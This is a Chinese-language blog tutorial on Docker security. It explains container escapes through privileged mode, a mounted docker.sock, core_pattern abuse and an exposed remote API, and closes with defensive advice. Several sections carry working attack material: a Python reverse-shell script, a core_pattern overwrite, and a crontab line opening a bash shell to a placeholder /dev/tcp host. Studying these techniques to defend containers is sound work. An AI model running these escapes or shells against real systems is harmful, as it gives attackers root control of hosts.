---
title: Docker 安全问题浅析
date: 2025-04-03 17:22:00
tags: [Web, 渗透]
categories: 渗透
---

学习一下常用的逃逸手法，以及如何设计一个安全的方案。
<!--more-->

## 前言

自从听说 Docker 给 root 会导致安全风险，潜意识就觉得 Docker 里的 root 和宿主机的 root 是一回事，但是被问到的时候面试官又说特权模式才会有风险，特权用户无所吊谓，不然 Namespaces 干嘛的呢？

## 前置知识

### UID & GID

我们知道，Linux 通过 UID 来标识用户，且 UID 是唯一的，UID 为 0 的用户是 root 用户。
可以通过 `/etc/passwd` 文件来查看用户信息，格式如下：

```bash
kali@cverc:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:102:105::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:103:106:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
syslog:x:104:111::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:113:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:116::/run/uuidd:/usr/sbin/nologin
systemd-oom:x:108:117:systemd Userspace OOM Killer,,,:/run/systemd:/usr/sbin/nologin
tcpdump:x:109:118::/nonexistent:/usr/sbin/nologin
avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
kernoops:x:113:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
avahi:x:114:121:Avahi mDNS daemon,,,:/run/avahi-daemon:/usr/sbin/nologin
cups-pk-helper:x:115:122:user for cups-pk-helper service,,,:/home/cups-pk-helper:/usr/sbin/nologin
rtkit:x:116:123:RealtimeKit,,,:/proc:/usr/sbin/nologin
whoopsie:x:117:124::/nonexistent:/bin/false
sssd:x:118:125:SSSD system user,,,:/var/lib/sss:/usr/sbin/nologin
speech-dispatcher:x:119:29:Speech Dispatcher,,,:/run/speech-dispatcher:/bin/false
fwupd-refresh:x:120:126:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
nm-openvpn:x:121:127:NetworkManager OpenVPN,,,:/var/lib/openvpn/chroot:/usr/sbin/nologin
saned:x:122:129::/var/lib/saned:/usr/sbin/nologin
colord:x:123:130:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
geoclue:x:124:131::/var/lib/geoclue:/usr/sbin/nologin
pulse:x:125:132:PulseAudio daemon,,,:/run/pulse:/usr/sbin/nologin
gnome-initial-setup:x:126:65534::/run/gnome-initial-setup/:/bin/false
hplip:x:127:7:HPLIP system user,,,:/run/hplip:/bin/false
gdm:x:128:134:Gnome Display Manager:/var/lib/gdm3:/bin/false
kali:x:1000:1000:kali,,,:/home/kali:/bin/bash
sshd:x:129:65534::/run/sshd:/usr/sbin/nologin
ftp:x:130:138:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
```

可以看到，用户分为如下几类：

- Root 用户：UID 为 0，拥有最高权限。
- 系统用户：UID 通常为 1-999（不同系统范围可能不同），用于运行系统服务（如 www-data、mysql）。
- 普通用户：UID 从 1000 或 10000 开始分配（依系统而定），供普通用户使用（如上面的 kali）。

文件/进程的访问权限都是基于 UID 进行判断的，进程在运行时会继承启动用户的 UID，决定其资源访问范围。
当然有特殊情况——那就是 setuid。
进程的 UID 其实还细分为 RUID（Real UID）和 EUID（Effective UID），前者是进程实际所有者的 UID，后者则决定进程权限，这就是 SUID（Set User ID） 机制。
刚好发现 WSL 的 `ping` 坏了（虽然我也不确实是不是一直都这样），具体表现就是没权限，详细如下：

```bash
$ ping baidu.com
ping: socktype: SOCK_RAW
ping: socket: Operation not permitted
ping: => missing cap_net_raw+p capability or setuid?
```

前几次都忍了，加个 `sudo` 也能用，但是今天既然都写到这就干脆修一下

```bash
$ ls -l /usr/bin/ping
-rwxr-xr-x 1 root root 156136 Sep 25  2024 /usr/bin/ping
```

执行 `sudo chmod u+s /usr/bin/ping`，再看：

```bash
-rwsr-xr-x 1 root root 156136 Sep 25  2024 /usr/bin/ping
```

可以看到多了个 `s`，即 SUID 的标志位，运行时会将 EUID 设置为文件所有者的 UID（即 root），就可以畅快地 ping 了。

值得一提的是，对于脚本文件（如 `.sh`），SUID 是无效的，只有二进制文件才有效，这也是 Linux 的安全设计，之前做渗透的时候踩过坑。

做渗透测试的时候也可以用 `find / -perm -4000` 命令查找 SUID 文件，利用它们来提权。
日常的生产实践还是优先使用 `sudo` 或者 Capabilities 机制来控制权限，SUID 只在必要时使用。

### Namespaces

Docker 有三大核心机制：

- Namespaces：隔离进程空间
- Cgroups：限制资源使用
- UnionFS：分层文件系统

那么其中 Namespaces 其实是有很多种的：

- Pid Namespaces：进程 ID 隔离
- UTS Namespaces：主机名隔离
- Mount Namespaces：挂载点隔离
- IPC Namespaces：进程间通信隔离
- Network Namespaces：网络隔离

接下来的就是我们今天的主角：User Namespaces，用户隔离。

## User Namespaces

User Namespaces 是 Linux 内核提供的一种隔离机制，可以将容器内的用户 ID 映射到宿主机的用户 ID，从而实现用户层面的隔离。
但是，这个 User Namespaces **不是默认开启的**，需要在 Docker 的配置文件中进行设置。
也就是说，**默认情况下，Docker 里的 root 跟宿主机的 root 就是一回事**，被面试官忽悠了，绷。

以下文提到的挂载 procfs 逃逸为例，没开 User Namespaces 的情况下，宿主机的 root 直接就被拿下了。

## Docker 逃逸

### 特权模式

emmmm 感觉没什么好解释的，顾明思义已经是特权模式了，想干嘛都行。

先启动一个特权模式的容器

```bash
docker run --rm --privileged=true -it alpine
```

执行如下命令检测一下

```bash
cat /proc/self/status | grep CapEff
```

若为 `0000003fffffffff` 或 `0000001fffffffff`，则表示为特权模式，拥有所有的 Capabilities

查看一下挂载磁盘设备

```bash
fdisk -l
```

吔？好像结果跟别人说的不太一样

```bash
# fdisk -l
Disk /dev/fd0: 1 MB, 1474560 bytes, 2880 sectors
1 cylinders, 145 heads, 16 sectors/track
Units: sectors of 1 * 512 = 512 bytes

Device   Boot StartCHS    EndCHS        StartLBA     EndLBA    Sectors  Size Id Type
/dev/fd0p1 90 656,144,16  656,144,16  2425393296  555819295 2425393296 1156G 90 Unknown
Partition 1 has different physical/logical start (non-Linux?):
     phys=(656,144,16) logical=(1045428,21,1)
Partition 1 has different physical/logical end:
     phys=(656,144,16) logical=(239577,40,16)
/dev/fd0p2 90 656,144,16  656,144,16  2425393296  555819295 2425393296 1156G 90 Unknown
Partition 2 has different physical/logical start (non-Linux?):
     phys=(656,144,16) logical=(1045428,21,1)
Partition 2 has different physical/logical end:
     phys=(656,144,16) logical=(239577,40,16)
/dev/fd0p3 90 656,144,16  656,144,16  2425393296  555819295 2425393296 1156G 90 Unknown
Partition 3 has different physical/logical start (non-Linux?):
     phys=(656,144,16) logical=(1045428,21,1)
Partition 3 has different physical/logical end:
     phys=(656,144,16) logical=(239577,40,16)
/dev/fd0p4 90 656,144,16  656,144,16  2425393296  555819295 2425393296 1156G 90 Unknown
Partition 4 has different physical/logical start (non-Linux?):
     phys=(656,144,16) logical=(1045428,21,1)
Partition 4 has different physical/logical end:
     phys=(656,144,16) logical=(239577,40,16)
Found valid GPT with protective MBR; using GPT

Disk /dev/sda: 41943040 sectors,     0
Logical sector size: 512
Disk identifier (GUID): 247954d6-7c12-4470-9429-09ba67b1bfc5
Partition table holds up to 128 entries
First usable sector is 34, last usable sector is 41943006

Number  Start (sector)    End (sector)  Size Name
     1            2048            4095 1024K
     2            4096         1054719  513M EFI System Partition
     3         1054720        41940991 19.4G
```

应该是虚拟机导致的。

尝试了下，上面那几个奇怪的玩意实际是不存在的，然后一直试到 `/dev/sda3` 就挂载上了

```bash
mount /dev/sda3 /mnt
```

此时宿主机的根目录就挂载上去了，`cd` 进去再 `chroot .` 即可。
当然写 crontab 挂一个反弹 shell 也可以。

### 挂载 Docker Socket

Docker Socket 是 Docker 的一个 Unix Socket 文件，默认路径为 `/var/run/docker.sock`，它允许用户通过 Docker CLI 与 Docker 守护进程进行通信。

创建一个容器并挂载 Docker Socket

```bash
docker run -itd --name with_docker_sock -v /var/run/docker.sock:/var/run/docker.sock ubuntu
```

容器里面安装一下 Docker

```bash
docker exec -it with_docker_sock /bin/bash
apt-get update
apt-get install curl -y
curl -fsSL https://get.docker.com/ | sh
```

查看是否存在 Docker Socket

```bash
ls -lah /var/run/docker.sock
```

若存在则说明这个漏洞可能存在，创建一个容器并挂载宿主机的根目录即可

```bash
docker run -it -v /:/mnt/ ubuntu
```

然后还是 `cd /mnt` 进去，`chroot .` 就逃逸出来了。

原理也很简单，我们现在 review 一下 Docker 启动一个容器的流程：

1. 命令行解析：Docker CLI 解析用户输入的命令行参数。
2. **API 调用：Docker CLI 通过 HTTP API 调用 Docker 守护进程。**
3. Dockerd 处理请求：Docker 守护进程接收请求并解析参数。
4. Containerd 和 runc：Docker 守护进程将请求传递给 containerd，containerd 负责容器的生命周期管理。runc 是一个低级别的容器运行时，负责创建和管理容器的命名空间、cgroups 等。

注意到上面加粗的文字，没错，就是在那里，Docker Socket 实际上是一个 Unix Socket 文件，Docker 守护进程通过这个文件接收来自 Docker CLI 的请求。

那就不难理解了，你把 Docker Socket 挂载到容器里，容器与这个 Socket 文件通信时，实际上是与宿主机的 Docker 守护进程通信，也就能随便操控宿主机的资源了。

### 挂载 procfs

创建一个容器并挂载 `/proc` 目录

```bash
docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu
```

看看有没有两个 `core_pattern` 文件

```bash
find / -name core_pattern
/proc/sys/kernel/core_pattern
/host/proc/sys/kernel/core_pattern
```

找到当前容器在宿主机下的绝对路径

```bash
cat /proc/mounts | xargs -d ',' -n 1 | grep workdir
workdir=/var/lib/docker/overlay2/0868dfee7b168e77da0dc40e8c6d4b0685396c1ee6bb015af76c6a9c5f9a2b49/work
```

这里说一下 `xargs` 命令，`-d` 选项指定分隔符，`-n` 选项指定每次传递给命令的参数个数。
如此其实也可以用如下命令只输出目录

```bash
cat /proc/mounts | xargs -d ',' -n 1 | grep workdir | xargs -d "=" | awk '{print $2}'
```

意思就是当前容器挂载在宿主机的 `/var/lib/docker/overlay2/0868dfee7b168e77da0dc40e8c6d4b0685396c1ee6bb015af76c6a9c5f9a2b49/merged` 目录下，去宿主机 `ls` 一下也可以确认

然后找个位置写一个反弹 shell 的脚本，我这里选择写在 `/tmp/t.py`

```python
#!/usr/bin/python3
import os
import pty
import socket
lhost = "<your_host_ip>"
lport = <your_host_port>
def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((lhost, lport))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    os.putenv("HISTFILE", '/dev/null')
    pty.spawn("/bin/bash")
    s.close()
if __name__ == "__main__":
    main()
```

加上执行权限（别忘了！！！）

```bash
chmod +x /tmp/t.py
```

写到宿主机的 `/proc` 目录下

```bash
echo -e "|/var/lib/docker/overlay2/0868dfee7b168e77da0dc40e8c6d4b0685396c1ee6bb015af76c6a9c5f9a2b49/merged/tmp/t.py \rcore    " >  /host/proc/sys/kernel/core_pattern
```

写一个可以触发 core dump 的程序

```c
#include<stdio.h>
int main(void)  {
   int *a  = NULL;
   *a = 1;
   return 0;
}
```

编译一下，执行

```bash
gcc t.c -o t
./t
```

记得在攻击机上开启监听

```bash
nc -lvnp <your_host_port>
```

宿主机 root 的 shell 就弹出来了。

现在说说原理：Linux 有一个核心转储（core dump）机制（这中文听着怪怪的哈），当**进程崩溃时**，内核会将进程的内存映像保存到一个文件，用于调试。

而 `/proc/sys/kernel/core_pattern` 定义了核心转储文件的生成规则。其格式分为：

1. 静态路径：如 `/var/crash/core.%p`（`%p` 表示进程 PID）。
2. 管道命令：以 | 开头时，内核会将 core dump 内容通过管道传递给指定程序，格式为：
`| /path/to/program %p [其他参数]`

相信这时候你也看出来了，上面的利用方式实际上是将 core dump 的内容作为参数传递给了 `/tmp/t.py`，而 `/tmp/t.py` 被 root 执行，从而反弹出 shell。

#### 拓展之 OverlayFS

我们知道 Docker 三大核心机制之一是 UnionFS，Docker 采用的是 OverlayFS。
先说 UnionFS，其核心思想就是分层叠加，类似“多层透明纸叠加”的效果，每张纸画不同的内容，叠加在一起就形成了一个完整的图像。
OverlayFS 则是 Linux 内核提供的一种 **UnionFS 的具体实现**。
OverlayFS 需要四个目录：

1. **lowerdir（下层目录）**：只读的基础层（如 Docker 镜像）。
2. **upperdir（上层目录）**：可写层，存放修改后的文件。
3. **merged（合并目录）**：最终用户看到的统一视图，合并了上下层内容。
4. **workdir（工作目录）**：系统内部用于处理文件操作（如临时存放复制的文件）。

**读取**文件时，若文件在 `upperdir` 中存在，则读取 `upperdir` 中的文件；否则读取 `lowerdir` 中的文件。
**修改** `lowerdir` 中的文件时，会触发写时复制（Copy-on-Write）机制，将文件复制到 `upperdir` 中进行修改，原文件保持不变
**删除**文件时，会在 `upperdir` 中标记一个“删除白板”，隐藏下层文件。
最终效果：通过 `merged` 目录，用户可以看到一个合并后的完整的文件系统视图，原始基础镜像（lowerdir）始终不变。

注意到上面提到的**写时复制**，这是应用非常广泛的一种设计模式。
可以概括出如下优点：

- **高效**：无需复制整个基础层，只有修改时才复制单个文件。
- **节省空间**：多个容器可以共享同一基础层，避免重复存储。
- **快速启动**：创建新容器时，只需创建新的 `upperdir` 和 `workdir`，而不需要复制整个文件系统。

现在我们可以瞄一眼文件系统中的实际结构：

```bash
ls /var/lib/docker/overlay2/0868dfee7b168e77da0dc40e8c6d4b0685396c1ee6bb015af76c6a9c5f9a2b49
diff link lower merged work
```

`diff` 是一个目录，对应 `upperdir`，`ls` 一下可以看到里面是一个不完整的容器的根目录，只包含我们修改过的文件。
`link` 是一个文件，存储该层的“短名称”（缩短的哈希值），用于简化目录引用，先不管他。

```bash
cat link
WKXKCJ67B3V6VZNJ7GP4REARER
```

`lower` 是一个文件，对应 `lowerdir`，记录该层的下层目录的哈希值，也待会再说

```bash
cat lower
l/5MMEIBNIEE5KXKNNZLRXW6U2YA:l/JVXDIO6M3RVT6N6O2ETGZQ5IY4
```

`merged` 是一个目录，即最终的合并视图，`ls` 看到的东西跟在容器里 `ls /`是一样的。
`work` 是一个目录，作为处理文件操作的临时工作区，在复制、删除或修改时，系统在这里完成原子操作，确保数据一致性，由 OverlayFS 自动管理。

现在我们再看一下那几个短哈希值

```bash
ls /var/lib/docker/overlay2/l -al
lrwxrwxrwx  1 root root   77  4月 10 21:58 5MMEIBNIEE5KXKNNZLRXW6U2YA -> ../0868dfee7b168e77da0dc40e8c6d4b0685396c1ee6bb015af76c6a9c5f9a2b49-init/diff
lrwxrwxrwx  1 root root   72  4月 10 21:58 WKXKCJ67B3V6VZNJ7GP4REARER -> ../0868dfee7b168e77da0dc40e8c6d4b0685396c1ee6bb015af76c6a9c5f9a2b49/diff
lrwxrwxrwx  1 root root   72  3月 20 15:05 JVXDIO6M3RVT6N6O2ETGZQ5IY4 -> ../78e27d8316131fb2b18adb91fd994cbe73436ed1685123f9e38ab7d36c4b7f52/diff
```

可以看到 `WKXKCJ67B3V6VZNJ7GP4REARER` 作为当前层，里面是有我们在容器里创建的文件的，`5MMEIBNIEE5KXKNNZLRXW6U2YA` 与 `JVXDIO6M3RVT6N6O2ETGZQ5IY4` 属于基础镜像层或者装 Python 之类的依赖后的层，里面的文件就比较朴素。

最终视图可以理解成这样

```plain
容器视图（merged）
├── 可写层（diff）     ← 容器运行时修改的文件
├── 层2（Python 安装）  ← l/JVXDIO6M3RVT6N6O2ETGZQ5IY4
└── 层1（Ubuntu 系统）  ← l/5MMEIBNIEE5KXKNNZLRXW6U2YA
```

### 挂载宿主机根目录

看过上文的读者应该对这个没什么疑问了，这个就是上面提到的攻击路径的最后一环，如特权模式、挂载 Docker Socket 等等，都是为了获取宿主机的根目录的访问权限，方法上就是挂载宿主机的根目录到容器里。

环境搭建命令如下：

```bash
docker run -it -v /:/mnt/ ubuntu
```

`cd` 进去，`chroot .` 就可以了，crontab 也可以，上文多次提到，不再赘述。

### Docker remote api 未授权访问

将 Dockerd 的监听设在 2375 端口：

```bash
sudo dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375
INFO[2025-04-22T10:39:23.909818793+08:00] Starting up
failed to start daemon, ensure docker is not running or delete /var/run/docker.pid: process with PID 1319 is still running
```

意思是要先关掉 Docker

```bash
sudo systemctl stop docker
```

再来

```bash
sudo dockerd -H unix:///var/run/docker.sock -H 0.0.0.0:2375
INFO[2025-04-22T10:40:38.151876920+08:00] Starting up
WARN[2025-04-22T10:40:38.152530906+08:00] Binding to IP address without --tlsverify is insecure and gives root access on this machine to everyone who has access to your network.  host="tcp://0.0.0.0:2375"
WARN[2025-04-22T10:40:38.152554700+08:00] Binding to an IP address, even on localhost, can also give access to scripts run in a browser. Be safe out there!  host="tcp://0.0.0.0:2375"
WARN[2025-04-22T10:40:38.152609238+08:00] [DEPRECATION NOTICE] In future versions this will be a hard failure preventing the daemon from starting! Learn more at: https://docs.docker.com/go/api-security/  host="tcp://0.0.0.0:2375"
WARN[2025-04-22T10:40:39.154871410+08:00] Binding to an IP address without --tlsverify is deprecated. Startup is intentionally being slowed down to show this message  host="tcp://0.0.0.0:2375"
WARN[2025-04-22T10:40:39.154978953+08:00] Please consider generating tls certificates with client validation to prevent exposing unauthenticated root access to your network  host="tcp://0.0.0.0:2375"
WARN[2025-04-22T10:40:39.155023761+08:00] You can override this by explicitly specifying '--tls=false' or '--tlsverify=false'  host="tcp://0.0.0.0:2375"
WARN[2025-04-22T10:40:39.155038038+08:00] Support for listening on TCP without authentication or explicit intent to run without authentication will be removed in the next release  host="tcp://0.0.0.0:2375"
INFO[2025-04-22T10:40:54.210520545+08:00] detected 127.0.0.53 nameserver, assuming systemd-resolved, so using resolv.conf: /run/systemd/resolve/resolv.conf
INFO[2025-04-22T10:40:54.447847216+08:00] [graphdriver] using prior storage driver: overlay2
INFO[2025-04-22T10:40:54.463550314+08:00] Loading containers: start.
INFO[2025-04-22T10:40:54.986964216+08:00] Default bridge (docker0) is assigned with an IP address 172.17.0.0/16. Daemon option --bip can be used to set a preferred IP address
INFO[2025-04-22T10:40:55.090980115+08:00] Loading containers: done.
WARN[2025-04-22T10:40:55.145707727+08:00] [DEPRECATION NOTICE]: API is accessible on http://0.0.0.0:2375 without encryption.
         Access to the remote API is equivalent to root access on the host. Refer
         to the 'Docker daemon attack surface' section in the documentation for
         more information: https://docs.docker.com/go/attack-surface/
In future versions this will be a hard failure preventing the daemon from starting! Learn more at: https://docs.docker.com/go/api-security/
INFO[2025-04-22T10:40:55.145782627+08:00] Docker daemon                                 commit="26.1.3-0ubuntu1~22.04.1" containerd-snapshotter=false storage-driver=overlay2 version=26.1.3
INFO[2025-04-22T10:40:55.145947337+08:00] Daemon has completed initialization
INFO[2025-04-22T10:40:55.236241515+08:00] API listen on /var/run/doc
```

可以看到输出中已经对安全性作了警告

在局域网中 `wget` 一下这个 IP:2375，若返回 404，则说明可能存在漏洞

```bash
IP=<your_host_ip>
curl http://$IP:2375/containers/json    # 列出容器信息
docker -H tcp://$IP:2375 ps -a  # 查看容器
```

攻击手法也是类似的，创建一个容器并挂载宿主机的根目录

```bash
docker -H tcp://$IP:2375 run -it -v /:/mnt/ ubuntu
```

依然 `cd` `chroot` 一把梭，抑或反弹 shell：

```bash
echo '* * * * * /bin/bash -i >& /dev/tcp/<ip>/<port> 0>&1' >> /mnt/var/spool/cron/crontabs/root
```

## 如何设计一个安全的容器方案

### 安全隐患

> 未知攻，焉知防？

先说说 Docker 的安全隐患，唠一唠车轱辘话。
Docker 的安全隐患主要分为三类：

1. **宿主机的操作系统**本身就存在安全隐患
    我们知道，Docker 跟宿主机是**共享内核**的，所以如果宿主机的内核存在漏洞，那么 Docker 也会受到影响。比如著名的脏牛提权漏洞（CVE-2016-5195）。
2. **容器自身**的安全问题
    1. 滥用 Docker API 攻击
    2. Docker 逃逸攻击
    3. 容器间通信的风险
    4. 容器配置不当引起的安全问题
3. **容器镜像**安全问题
    1. 无法检测安全性
    2. 不安全的镜像源

### 安全防护

容器的安全防护应该从容器的整个生命周期来考虑，包括一个容器镜像从**创建、传输、运行到停止**的全过程。

1. 创建阶段
    1. 代码审计
    2. 可信基础镜像
    3. 容器镜像加固
    4. 容器镜像扫描
    5. 基础镜像安全管理
2. 传输阶段
    1. 镜像签名
    2. 用户访问控制
    3. 支持 HTTPS 的镜像仓库
3. 运行阶段
    1. 对容器主机进行加固
    2. 容器安全配置
    3. 容器隔离
    4. 容器安全监控与审计
    5. 容器安全防护与入侵检测
    6. 容器运行时的漏洞扫描
    7. 网络安全防护

## 参考

[Isolate containers with a user Namespaces](https://docs.docker.com/engine/security/userns-remap/#about-remapping-and-subordinate-user-and-group-ids)
[Docker 魔法解密：探索 UnionFS 与 OverlayFS](https://zhuanlan.zhihu.com/p/679328995)
[T Wiki](https://wiki.teamssix.com/)
